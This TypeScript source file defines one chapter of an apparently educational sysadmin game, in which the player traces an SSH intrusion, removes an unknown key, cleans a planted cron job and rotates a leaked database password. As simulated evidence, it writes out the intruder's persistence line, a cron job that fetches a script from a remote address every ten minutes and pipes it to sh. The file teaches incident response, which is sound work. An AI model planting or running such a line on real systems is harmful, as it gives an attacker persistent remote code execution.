// Story "The Audit" — chapter "The Traces": third part of Salomé's report.
// In ssh's log, a login to Nadia's account, in the night of 13 March at
// 3:12 a.m., from an address (203.0.113.99) she doesn't know: "I was asleep,
// and my key is only on the shop's computer." Follow the trace, then clean up:
//   - journalctl -u ssh, last: who, when, from where, with which key (the
//     fingerprint is in the log);
//   - sudo ssh-keygen -l -f ~nadia/.ssh/authorized_keys: which of the two
//     keys has this fingerprint. The comment ("nadia@portable") proves
//     nothing: only the fingerprint counts;
//   - remove this key, and only it (Nadia must still be able to log in);
//   - look for what the intruder left: a cron job of Nadia's
//     (sudo crontab -u nadia -l) that calls back to their server every ten
//     minutes, to remove without taking the real job (sauvegarde.sh) along.
//   - Nadia's history also shows that the intruder read /srv/commandes/.env
//     (readable by everyone at the time: "The Report"): the database
//     password is compromised. Change it for real, on both sides: in
//     PostgreSQL (ALTER ROLE … PASSWORD, with sudo -u postgres psql) AND in
//     .env, then restart the app (it reads .env at start).
// Real traps: erasing all of authorized_keys (Nadia locked out),
// crontab -r (the backup disappears too), trusting the key's comment,
// changing the password on one side only (the app no longer reconnects on
// restart), a password too short or unchanged.
// Objective checked on the state: the intruder's key removed and Nadia's
// kept, the intruder's job removed and the backup kept, a new database
// password long enough, the same in PostgreSQL and in .env, and the app
// restarted with it.
// Sources: https://man.openbsd.org/ssh-keygen, https://man.openbsd.org/sshd,
// https://man7.org/linux/man-pages/man5/crontab.5.html,
// https://man7.org/linux/man-pages/man1/last.1.html,
// https://www.postgresql.org/docs/current/sql-alterrole.html

import { d, f, player, type Chapter } from '../world';
import { postgres, type PostgresState } from '../postgres';
import type { Game } from '../shell';
import { keyFingerprint } from '../machines';
import type { Rule } from '../firewall';
import { newFirewall } from '../firewall';
import { newSystemd, systemd } from '../systemd';
import type { Listening } from '../commands/ss';
import { loadSshd, KEYS, bakeryAccounts, file, sshLog, M, NOW, PASSWORD, bakeryWorld, serviceSsh } from './audit';

const INTRUDER = '203.0.113.99';
const BOUTIQUE = '198.51.100.7';
const NADIA_KEYS = '/home/nadia/.ssh/authorized_keys';
const BACKUP = '0 4 * * * /srv/commandes/bin/sauvegarde.sh';
// What the intruder left: every ten minutes, a program fetched from their server.
const TAG = `*/10 * * * * curl -fsS http://${INTRUDER}/b | sh`;
const CRONTAB_NADIA = `# m h  dom mon dow   command\n${BACKUP}\n${TAG}`;

const OLD_PASSWORD = 'brioche-beurre-91';
const ENV = '/srv/commandes/.env';
const urlBase = (mdp: string) => `DATABASE_URL=postgres://commandes:${mdp}@localhost:5432/commandes`;
const CONTENT_ENV = `PORT=3000\n${urlBase(OLD_PASSWORD)}\nREDIS_URL=redis://localhost:6379`;
// What the intruder typed, in the history of Nadia's account.
const HISTORY = `id\ncat ${ENV}\ncrontab -l\n(crontab -l; echo '${TAG}') | crontab -\nexit`;

const day = (monthDay: number, h: number, m: number, s = 0) => Date.UTC(2028, 2, monthDay, h, m, s);

const body = (key: string) => key.split(' ')[1];
const lines = (text: string | null) => (text ?? '').split('\n').filter((l) => l.trim());
const keys = (j: Game) => lines(j.read(NADIA_KEYS));
const intruderKey = (j: Game) => keys(j).some((l) => body(l) === body(KEYS.unknown));
const nadiaKey = (j: Game) => keys(j).some((l) => body(l) === body(KEYS.nadia));
const crontab = (j: Game) => lines((j.state.crontabs as Record<string, string> | undefined)?.nadia ?? null).filter((l) => !l.startsWith('#'));
const leftTag = (j: Game) => crontab(j).some((l) => l.includes(INTRUDER));
const keptBackup = (j: Game) => crontab(j).some((l) => /sauvegarde\.sh/.test(l));
const basePassword = (j: Game) => postgres(j)?.passwords?.commandes ?? '';
const filePassword = (j: Game) => /^DATABASE_URL=postgres:\/\/commandes:([^@]*)@/m.exec(j.read(ENV) ?? '')?.[1] ?? '';
// The app reads .env when it starts: the password it uses is the one from the last start.
const appLPassword = (j: Game) => (j.state.appPassword as string | undefined) ?? '';
const activeApp = (j: Game) => systemd(j)!.services.commandes.state === 'active';
const changeBase = (j: Game) => basePassword(j) !== OLD_PASSWORD;
const longEnough = (j: Game) => basePassword(j).length >= 12;
const accord = (j: Game) => filePassword(j) === basePassword(j);
const okPassword = (j: Game) => changeBase(j) && longEnough(j) && accord(j) && activeApp(j) && appLPassword(j) === basePassword(j);
const okKeys = (j: Game) => !intruderKey(j) && nadiaKey(j);
const cronOk = (j: Game) => !leftTag(j) && keptBackup(j);

const LISTENING: Listening[] = [
  { proto: 'tcp', address: '0.0.0.0', port: 22, process: 'sshd', pid: 612 },
  { proto: 'tcp', address: '0.0.0.0', port: 80, process: 'nginx', pid: 701 },
  { proto: 'tcp', address: '0.0.0.0', port: 443, process: 'nginx', pid: 701 },
  { proto: 'tcp', address: '127.0.0.1', port: 5432, process: 'postgres', pid: 744 },
  { proto: 'tcp', address: '127.0.0.1', port: 6379, process: 'redis-server', pid: 760 },
  { proto: 'tcp', address: '127.0.0.1', port: 3000, process: 'node', pid: 731 },
];
// The previous chapter's firewall: SSH, 80 and 443.
const RULES: Rule[] = [
  { action: 'allow', to: 'OpenSSH', ports: [22], forEachOf: null },
  { action: 'allow', to: 'Nginx Full', ports: [80, 443], forEachOf: null },
];

export const traces: Chapter = {
  id: 'traces',
  number: 4,
  commands: [
    'ls',
    'cd',
    'pwd',
    'cat',
    'less',
    'head',
    'tail',
    'grep',
    'find',
    'nano',
    'sudo',
    'id',
    'whoami',
    'who',
    'last',
    'ps',
    'crontab',
    'ssh-keygen',
    'psql',
    'systemctl',
    'journalctl',
  ],
  home: M,
  welcome: 'email_salome.txt',
  names: true,
  final: 'end',
  steps: ['found', 'key-identified', 'key-revoked', 'cron-found', 'cron-cleaned', 'secret-seen', 'password', 'end'],
  password: PASSWORD,
  accounts: () => {
    const c = bakeryAccounts(false);
    c.users.postgres = { uid: 115, group: 'postgres', home: '/var/lib/postgresql', shell: '/bin/bash' };
    c.groups.postgres = { gid: 122, members: [] };
    return c;
  },
  state: (t) => ({
    sshd: { load: {}, connectionsToLoad: 1, reloads: 0 },
    ufw: { ...newFirewall(), enabled: true, rules: RULES.map((r) => ({ ...r })) },
    listening: LISTENING.map((e) => ({ ...e })),
    crontabs: { nadia: CRONTAB_NADIA },
    pastConnections: [
      { account: 'nadia', tty: 'pts/1', since: BOUTIQUE, start: day(9, 18, 2), end: day(9, 18, 40) },
      { account: 'nadia', tty: 'pts/1', since: BOUTIQUE, start: day(10, 17, 55), end: day(10, 18, 20) },
      { account: 'nadia', tty: 'pts/2', since: INTRUDER, start: day(13, 3, 12), end: day(13, 3, 15) },
      { account: 'nadia', tty: 'pts/1', since: BOUTIQUE, start: day(13, 18, 2), end: day(13, 18, 31) },
      { account: player(t), tty: 'pts/0', since: '192.0.2.2', start: NOW - 60_000, end: null },
    ],
    systemd: newSystemd('bakery', NOW - 9 * 86_400_000, NOW, {
      ssh: serviceSsh(),
      nginx: { description: 'A high performance web server and a reverse proxy server', active: true, executable: 'nginx' },
      cron: { description: 'Regular background program processing daemon', active: true, executable: 'cron' },
      postgresql: { description: 'PostgreSQL RDBMS', active: true, executable: 'postgres' },
      commandes: {
        description: 'Fournil orders (commandes)',
        active: true,
        executable: 'node',
        process: [{ pid: 731, user: 'commandes', cpu: 0.8, mem: 3.1, command: '/usr/bin/node /srv/commandes/app/server.js' }],
        // The app reads .env at start and connects to the database with this password.
        check: (j) =>
          filePassword(j) === basePassword(j) ? null : ['error: password authentication failed for user "commandes"', "    at Parser.parseErrorMessage (/srv/commandes/app/node_modules/pg-protocol/dist/parser.js:283:98) { code: '28P01' }"],
        load: (j) => {
          j.state.appPassword = filePassword(j);
        },
      },
    }),
    postgres: {
      bases: { postgres: { owner: 'postgres', tables: {} }, commandes: { owner: 'commandes', tables: {} } },
      roles: ['postgres', 'commandes'],
      archives: {},
      passwords: { commandes: OLD_PASSWORD },
    } satisfies PostgresState,
    // The start before the night of 13 March: the app runs with the old password.
    appPassword: OLD_PASSWORD,
  }),
  // ssh's log: Nadia's logins, the one in the night, the bots.
  initialise: (j) => {
    loadSshd(j);
    const nadia = keyFingerprint(KEYS.nadia);
    const intruder = keyFingerprint(KEYS.unknown);
    const accepts = (h: number, pid: number, account: string, address: string, port: number, fingerprint: string, end?: number) => {
      sshLog(j, h, pid, `Accepted publickey for ${account} from ${address} port ${port} ssh2: ED25519 ${fingerprint}`);
      sshLog(j, h + 1000, pid, `pam_unix(sshd:session): session opened for user ${account}(uid=${account === 'nadia' ? 1001 : 1000}) by (uid=0)`);
      if (end) sshLog(j, end, pid, `pam_unix(sshd:session): session closed for user ${account}`);
    };
    sshLog(j, day(8, 2, 14), 1511, 'Invalid user admin from 198.51.100.23 port 40112');
    accepts(day(9, 18, 2), 1702, 'nadia', BOUTIQUE, 50412, nadia, day(9, 18, 40));
    accepts(day(10, 17, 55), 1788, 'nadia', BOUTIQUE, 50871, nadia, day(10, 18, 20));
    sshLog(j, day(12, 22, 31), 1920, 'Connection closed by authenticating user root 192.0.2.201 port 33870 [preauth]');
    accepts(day(13, 3, 12), 2104, 'nadia', INTRUDER, 52144, intruder, day(13, 3, 15));
    accepts(day(13, 18, 2), 2310, 'nadia', BOUTIQUE, 50933, nadia, day(13, 18, 31));
  },
  createWorld: (t) =>
    bakeryWorld(t, {
      withoutLucas: true,
      home: { 'email_salome.txt': f(t('traces-email-salome')) },
      more: {
        srv: d(
          {
            commandes: d(
              { '.env': f(CONTENT_ENV, { lines: true, owner: 'commandes', group: 'commandes', mode: 'rw-------' }) },
              undefined,
              { owner: 'commandes' },
            ),
          },
          undefined,
          { owner: 'root' },
        ),
      },
      ssh: { 'sshd_config.d': d({ '00-hardening.conf': file('PermitRootLogin no', 'root') }, undefined, { owner: 'root' }) },
      homes: {
        nadia: d(
          {
            '.bash_history': f(HISTORY, { lines: true, owner: 'nadia', mode: 'rw-------' }),
            '.ssh': d(
              { authorized_keys: f([KEYS.nadia, KEYS.unknown].join('\n'), { lines: true, owner: 'nadia', mode: 'rw-------' }) },
              undefined,
              { owner: 'nadia', mode: 'rwx------' },
            ),
          },
          undefined,
          { owner: 'nadia', mode: 'rwx------' },
        ),
      },
    }),
  events: [
    {
      id: 'found',
      condition: (j) => j.last.commands.some((c) => ['journalctl', 'last', 'grep'].includes(c[0])) && j.last.output.includes(INTRUDER),
      message: (j) => j.t('traces-event-found', { address: INTRUDER }),
    },
    {
      id: 'key-identified',
      condition: (j) => j.last.commands.some((c) => c[0] === 'ssh-keygen') && j.last.output.includes(keyFingerprint(KEYS.unknown)),
      message: (j) => j.t('traces-event-key-identified'),
    },
    { id: 'nadia-locked-out', condition: (j) => !nadiaKey(j), message: (j) => j.t('traces-event-nadia-locked-out') },
    { id: 'key-revoked', condition: okKeys, message: (j) => j.t('traces-event-key-revoked') },
    {
      id: 'cron-found',
      condition: (j) => j.last.commands.some((c) => c[0] === 'crontab') && j.last.output.includes(INTRUDER),
      message: (j) => j.t('traces-event-cron-found'),
    },
    { id: 'backup-lost', condition: (j) => !keptBackup(j), message: (j) => j.t('traces-event-backup-lost') },
    { id: 'cron-cleaned', condition: cronOk, message: (j) => j.t('traces-event-cron-cleaned') },
    {
      id: 'secret-seen',
      condition: (j) => j.last.output.includes(`cat ${ENV}`),
      message: (j) => j.t('traces-event-secret-seen'),
    },
    {
      id: 'password-weak',
      condition: (j) => changeBase(j) && !longEnough(j),
      message: (j) => j.t('traces-event-password-weak'),
    },
    {
      id: 'a-restart',
      condition: (j) => changeBase(j) && longEnough(j) && accord(j) && activeApp(j) && appLPassword(j) !== basePassword(j),
      message: (j) => j.t('traces-event-a-restart'),
    },
    {
      id: 'app-down',
      condition: (j) => !activeApp(j) && !accord(j),
      message: (j) => j.t('traces-event-app-down'),
    },
    { id: 'password', condition: okPassword, message: (j) => j.t('traces-event-password') },
    { id: 'end', condition: (j) => okKeys(j) && cronOk(j) && okPassword(j), message: (j) => j.t('traces-event-end') },
  ],
};
